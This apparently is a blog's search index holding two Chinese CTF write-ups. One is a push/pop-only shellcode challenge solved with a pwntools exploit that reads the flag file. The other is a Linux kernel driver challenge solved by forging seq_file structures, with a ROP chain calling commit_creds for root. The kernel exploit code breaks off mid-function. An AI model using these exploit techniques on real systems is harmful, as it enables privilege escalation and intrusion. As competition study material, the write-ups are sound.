<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025 Securinets CTF PushPullPop wp</title>
    <link href="/2025/10/06/sec2025pushpullpop/"/>
    <url>/2025/10/06/sec2025pushpullpop/</url>
    
    <content type="html"><![CDATA[<p>å‡ºé¢˜äººä½ è¿˜å¥½å—ï¼Ÿæˆ‘ä¸å¥½:)</p><span id="more"></span><h1 id="Push-Pop-Shellcode"><a href="#Push-Pop-Shellcode" class="headerlink" title="Push Pop Shellcode"></a>Push Pop Shellcode</h1><p>åªèƒ½æœ‰pushå’Œpopçš„shellcodeï¼Œä¸”pushå’Œpopçš„å‚æ•°åªèƒ½æ˜¯å¯„å­˜å™¨</p><h1 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h1><p>å¯ä»¥ç”¨æ— æ•ˆå­—èŠ‚ç ï¼ˆå¦‚<code>0x60</code>ï¼‰è¿›è¡Œæˆªæ–­ï¼Œè¿™æ ·åé¢çš„å­—èŠ‚ç å°±ä¸ä¼šæ£€æŸ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> insn <span class="hljs-keyword">in</span> md.disasm(code, <span class="hljs-number">0</span>):<br>    name = insn.insn_name()<br>    <span class="hljs-keyword">if</span> name!=<span class="hljs-string">&quot;pop&quot;</span> <span class="hljs-keyword">and</span> name!=<span class="hljs-string">&quot;push&quot;</span> :<br>        <span class="hljs-keyword">if</span> name==<span class="hljs-string">&quot;int3&quot;</span> :<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> insn.operands[<span class="hljs-number">0</span>].<span class="hljs-built_in">type</span>!=CS_OP_REG:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p><em>expå¿˜å­˜äº†â€¦â€¦ğŸ¤¡</em></p><p>å¯ä»¥æŠŠæ ˆè¿åˆ°rwxä¸Šï¼Œè®¾raxä¸ºä¸€ä¸ªåˆæ³•åœ°å€ï¼Œç„¶åpushä¸€ä¸ª0ï¼ˆ<code>add [rax], al</code>ï¼‰æŠŠæ— æ•ˆå­—èŠ‚ç æ”¹äº†å°±è¡Œ</p><h1 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h1><p>ä¸èƒ½æˆªæ–­äº†ï¼Œé‰´äºä¸èƒ½pushç«‹å³æ•°ï¼Œæƒ³é€ syscallåªæœ‰åˆ©ç”¨å†…å­˜é‡Œå·²æœ‰çš„æ•°æ®</p><p>ä½†<code>0x50f</code>ä¸æ˜¯ä¸ªå¥½æ‰¾çš„æ•°ï¼Œå°±ç®—æœ‰æƒ³é æ ˆè¿ç§»+popåˆ°è¾¾ä¹Ÿå¾ˆå›°éš¾ï¼Œ<em>è€Œä¸”å†…å­˜å†…å®¹æ˜¯ä¸ªç„å­¦:(</em></p><p>åæ¥è€ƒè™‘åœ¨å¯å†™æ®µä¸Šæ‰¾èƒ½å½“æŒ‡ä»¤æ‰§è¡Œçš„æ•°æ®ï¼ˆè¿™æ ·å¯ä»¥<code>push xxx; pop rsp</code>æ ˆè¿è¿‡å»å†è¿å›æ¥ï¼‰ï¼Œæœ€åè€ƒè™‘æŒ‡ä»¤<code>add [rax], dl</code>ï¼Œ<code>0x1000</code>æ˜¯ä¸ªæ›´å¸¸è§çš„æ•°æ®ï¼Œæ ˆä¸Šç¨³å®šæœ‰ä¸€ä¸ª</p><img src="/2025/10/06/sec2025pushpullpop/0x1000.png" class title="0x1000"><p>ä¸”æ ˆä¸Šçš„æœç´¢æ¯”è¾ƒæ–¹ä¾¿ï¼Œå¯ä»¥é€šè¿‡rbpé“¾å¿«é€Ÿè·³è·ƒ</p><img src="/2025/10/06/sec2025pushpullpop/rbp.png" class title="rbp"><p>ç„¶åç”¨<code>0x1000</code>æ”¹å­—èŠ‚ç å†™ä¸€ä¸ª<code>0x50f</code>å‡ºæ¥</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">import</span> base64<br><br>p=remote(<span class="hljs-string">&#x27;pwn-14caf623.p1.securinets.tn&#x27;</span>,<span class="hljs-number">9090</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,5000)</span><br>pl=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    pop r15;</span><br><span class="hljs-string">    pop r15;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop rdx&#x27;</span>)*<span class="hljs-number">0x11</span><br>pl+=asm(<span class="hljs-string">&#x27;pop rbx&#x27;</span>)*<span class="hljs-number">3</span><br>pl+=asm(<span class="hljs-string">&#x27;pop rcx&#x27;</span>)*<span class="hljs-number">2</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15; push rax;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;push rsp; push rsp; pop r14; pop r13;&#x27;</span>)<br><br>pl+=asm(<span class="hljs-string">&#x27;push r13; pop rax; pop r15; pop r15; push r11; pop rsp;&#x27;</span>)<br><br><span class="hljs-comment"># padding 1</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">0x30</span><br><br>pl+=asm(<span class="hljs-string">&#x27;pushw %cx&#x27;</span>)*<span class="hljs-number">0xf</span><br>pl+=asm(<span class="hljs-string">&#x27;popw %r15w&#x27;</span>)*<span class="hljs-number">0xf</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;popw %r15w&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pushw %cx&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;popw %r15w&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;popw %r15w&#x27;</span>)*<span class="hljs-number">5</span><br>pl+=asm(<span class="hljs-string">&#x27;pushw %cx&#x27;</span>)*<span class="hljs-number">5</span><br><br><span class="hljs-comment"># padding 2</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">60</span><br><br>pl+=asm(<span class="hljs-string">&#x27;push r14; pop rax; pop rsi; pop r15; pop r15;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)      <span class="hljs-comment"># pad</span><br>pl+=asm(<span class="hljs-string">&#x27;push rax; pop rsp; pop rax; pop r15;&#x27;</span>)+asm(<span class="hljs-string">&#x27;pop rsi&#x27;</span>)*<span class="hljs-number">3</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">5</span>    <span class="hljs-comment"># pad</span><br><br>pl+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push r13;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop r10;</span><br><span class="hljs-string">    push rdi;</span><br><span class="hljs-string">    pop rax;</span><br><span class="hljs-string">    push r11;</span><br><span class="hljs-string">    pop rsi;</span><br><span class="hljs-string">    push rcx;</span><br><span class="hljs-string">    pop rdx;</span><br><span class="hljs-string">    push r11;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">0x4a</span><br>pl+=asm(<span class="hljs-string">&#x27;push r10&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">2</span><br>pl+=asm(<span class="hljs-string">&#x27;push r13; pop rsp;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(pl))<br>sc=base64.b64encode(pl)<br>pause()<br>p.sendlineafter(<span class="hljs-string">b&#x27;Shellcode : &#x27;</span>,sc)<br>pause()<br><br>shellcode=<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x24a</span>+asm(shellcraft.cat(<span class="hljs-string">&#x27;/app/flag.txt&#x27;</span>))<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 ASIS CTF FileNo wp</title>
    <link href="/2025/09/18/asis2025fileno/"/>
    <url>/2025/09/18/asis2025fileno/</url>
    
    <content type="html"><![CDATA[<p>ğŸ¤¡</p><span id="more"></span><h1 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h1><p>è¯»å†™file-&gt;private_data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (cmd == CMD_READ) &#123;<br>    req.val = (<span class="hljs-type">long</span>)target-&gt;private_data;<br>    <span class="hljs-keyword">if</span> (copy_to_user((<span class="hljs-type">req_t</span> __user *)arg, &amp;req, <span class="hljs-keyword">sizeof</span>(req))) &#123;<br>      ret = -EFAULT;<br>      <span class="hljs-keyword">goto</span> unlock_on_fail;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// CMD_WRITE</span><br>target-&gt;private_data = (<span class="hljs-type">void</span>*)req.val;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹fileçš„è¦æ±‚S_ISREGæœ€åŸºæœ¬æ»¡è¶³ï¼š</p><ul><li>édir</li><li>élink</li><li>échar driver</li><li>éblock driver</li><li>épipe</li><li>ésocket</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!S_ISREG(file_inode(target)-&gt;i_mode)) &#123;<br>ret = -EBADF;<br><span class="hljs-keyword">goto</span> unlock_on_fail;<br>&#125;<br></code></pre></td></tr></table></figure><p><em>æœ€å¤§çš„é—®é¢˜å…¶å®å°±æ˜¯æœç´¢æœ‰private_dataçš„reg fileâ€¦â€¦</em></p><h1 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h1><p>ç›´æ¥è¿›è¡Œä¸€ä¸ªæš´åŠ›æœç´¢<code>-&gt;private_data</code>ğŸ™‚ï¼Œç„¶åå‘ç°ä¸€ä¸ªseq_fileï¼Œä¹‹å‰å¥½åƒè§è¿‡ï¼Œé‚£å°±è¿™ä¸ªäº†ï¼</p><h2 id="seq-file"><a href="#seq-file" class="headerlink" title="seq_file"></a>seq_file</h2><p>æ‰“å¼€ä¸€ä¸ª<code>/proc/self/stat</code>æ–‡ä»¶ï¼Œfile-&gt;private_dataæŒ‡å‘ä¸€ä¸ªseq_file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> from;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-type">size_t</span> pad_until;<br><span class="hljs-type">loff_t</span> index;<br><span class="hljs-type">loff_t</span> read_pos;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br><span class="hljs-type">int</span> poll_event;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">void</span> *private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥åŠ«æŒseq_file-&gt;bufè¿›è¡Œä»»æ„è¯»ï¼Œä¼ªé€ seq_operationsåŠ«æŒæ§åˆ¶æµ</p><p><em>æ‰¾gadgetæ¥æ ˆè¿ç§»ç ”ç©¶äº†å¥½ä¹…ï¼ˆ</em></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>å–·seq_fileç„¶ådiscard slabï¼ŒpipeæŠŠpage allocå›æ¥æ•´é¡µä¼ªé€ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_READ    0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_WRITE   0x1338</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">long</span> val;<br>&#125; <span class="hljs-type">req_t</span>;<br><br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">dev_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd)</span>&#123;<br><span class="hljs-type">req_t</span> arg = &#123;<br>.fd = fd,<br>.val = <span class="hljs-number">0</span>,<br>&#125;;<br>ioctl(fd_dev, CMD_READ, &amp;arg);<br><span class="hljs-keyword">return</span> arg.val;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dev_write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> val)</span>&#123;<br><span class="hljs-type">req_t</span> arg = &#123;<br>.fd = fd,<br>.val = val,<br>&#125;;<br><span class="hljs-keyword">return</span> ioctl(fd_dev, CMD_WRITE, &amp;arg);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd_addr</span> &#123;</span><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">size_t</span> addr;<br>&#125; object;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>N_PAGE_NUM0xe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_FDS0x22*N_PAGE_NUM</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_PAGES0x10</span><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x1000</span>];<br>object sprays[<span class="hljs-number">0x13</span>][<span class="hljs-number">0x22</span>];<br><span class="hljs-type">int</span> pipe_fd[N_PAGES][<span class="hljs-number">2</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> target)</span>&#123;<br><span class="hljs-type">size_t</span> *ptr = (<span class="hljs-type">size_t</span> *)buffer;<br><br><span class="hljs-comment">// 0xffffffff8132b8f4: pop rsp; ret;</span><br><span class="hljs-comment">// 0xffffffff819e613f: push rdi; adc ch, cl; imul edi, edi, -1; jmp qword ptr [rsi + 0x45]</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RDI_JMP_RSI0x9e613f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSP_RET0x32b8f4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RSP_ADD_88_RET0x20119C</span><br><br><span class="hljs-comment">// fake seq_file</span><br>ptr[<span class="hljs-number">0</span>] = kernel_base+RSP_ADD_88_RET;<br>ptr[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">6</span>] = <span class="hljs-number">0x10</span>;<br>ptr[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">9</span>] = target+<span class="hljs-number">0x48</span>;<br>ptr[<span class="hljs-number">10</span>] = target+<span class="hljs-number">0x48</span>;<br>ptr[<span class="hljs-number">11</span>] = target+<span class="hljs-number">0x80</span>;<span class="hljs-comment">// [rdi+80h] fake_operations</span><br>ptr[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span>;<br><br>*(<span class="hljs-type">size_t</span> *)((<span class="hljs-type">size_t</span>)buffer+<span class="hljs-number">0x28</span>+<span class="hljs-number">0x45</span>) = kernel_base + POP_RSP_RET;<br><br><span class="hljs-comment">// fake seq_operations</span><br>ptr[<span class="hljs-number">16</span>] = kernel_base + PUSH_RDI_JMP_RSI;<br>ptr[<span class="hljs-number">17</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">18</span>] = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// rop chain</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET0x306a4d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED0xE3BF60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS    0x2a3a90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAP_RET0x1787</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0x2af543</span><br>ptr[<span class="hljs-number">89</span>] = kernel_base+POP_RDI_RET;<br>ptr[<span class="hljs-number">90</span>] = kernel_base+INIT_CRED;<br>ptr[<span class="hljs-number">91</span>] = kernel_base+COMMIT_CREDS;<br>ptr[<span class="hljs-number">92</span>] = kernel_base+SWAP_RET;<br>ptr[<span class="hljs-number">93</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">94</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">95</span>] = (<span class="hljs-type">size_t</span>)&amp;get_root_shell;<br>ptr[<span class="hljs-number">96</span>] = user_cs;<br>ptr[<span class="hljs-number">97</span>] = user_rflags;<br>ptr[<span class="hljs-number">98</span>] = user_sp;<br>ptr[<span class="hljs-number">99</span>] = user_ss;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br>write(pipe_fd[i][<span class="hljs-number">1</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>save_status();<br>bind_core(<span class="hljs-number">0</span>);<br><br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, O_RDWR);<br><span class="hljs-type">size_t</span> pre = <span class="hljs-number">-1</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br><span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>perror(<span class="hljs-string">&quot;pipe&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> i=<span class="hljs-number">-1</span>, j=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(i &lt; N_PAGE_NUM)&#123;<br><span class="hljs-type">int</span> fd_tmp = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(fd_tmp &lt; <span class="hljs-number">0</span>)&#123;<br>            perror(<span class="hljs-string">&quot;open&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>read(fd_tmp, buffer, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-type">size_t</span> addr = dev_read(fd, fd_tmp);<br><span class="hljs-keyword">if</span>(pre != (addr &amp; <span class="hljs-number">0xfffffffffffff000</span>))&#123;<br>pre = addr &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>i++;<br>j=<span class="hljs-number">0</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>j++;<br>&#125;<br>sprays[i][j].fd = fd_tmp;<br>sprays[i][j].addr = addr;<br>page_offset_base = addr 